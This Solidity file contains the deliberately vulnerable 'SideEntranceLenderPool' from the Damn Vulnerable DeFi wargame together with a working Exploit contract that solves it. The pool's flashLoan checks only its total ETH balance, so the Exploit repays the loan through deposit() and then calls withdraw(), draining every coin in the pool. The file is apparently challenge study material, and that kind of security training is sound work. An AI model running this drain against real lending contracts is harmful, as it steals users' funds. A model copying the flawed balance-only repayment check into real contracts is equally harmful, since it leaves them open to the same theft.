// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {Address} from "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    using Address for address payable;

    mapping(address => uint256) private balances;

    error NotEnoughETHInPool();
    error FlashLoanHasNotBeenPaidBack();

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        if (balanceBefore < amount) revert NotEnoughETHInPool();

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore) {
            revert FlashLoanHasNotBeenPaidBack();
        }
    }
}

contract Exploit is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    receive() external payable {}

    //flashLoan calls `execute`, which we can use to "deposit" the loan
    //amount back into the pool, under disguise of a regular deposit.
    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    function exploit() public {
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);
        pool.withdraw();
    }
}
